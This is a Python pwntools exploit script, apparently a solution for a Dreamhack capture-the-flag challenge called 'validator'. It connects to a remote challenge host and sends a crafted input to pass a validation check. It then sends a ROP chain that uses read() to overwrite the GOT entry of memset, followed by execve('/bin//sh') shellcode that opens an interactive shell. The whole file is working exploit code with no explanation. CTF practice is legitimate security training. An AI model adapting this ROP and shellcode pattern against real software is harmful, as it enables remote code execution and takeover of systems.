from pwn import *

# gadgets
pop_rdi =       0x00000000004006f3
pop_rsi_r15 =   0x00000000004006f1
pop_rdx =       0x000000000040057b

# remote connect
#p = process("./validator_dist")
p = remote("host1.dreamhack.games", 11534)
e = ELF("./validator_dist")

# validate
payload = b"DREAMHACK! "
i = 127;
while(True):
    if(len(payload) == 129):
        break;
    payload += (i).to_bytes(1, byteorder="little")
    i -= 1
payload += b"a"*7

# ROP
payload += p64(pop_rdi)
payload += p64(0)

payload += p64(pop_rsi_r15)
payload += p64(e.got["memset"])
payload += p64(0)

payload += p64(pop_rdx)
payload += p64(0xffff)

payload += p64(e.plt["read"])

payload += p64(e.got["memset"])

p.send(payload)

# shellcode
shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
p.send(shellcode)

p.interactive()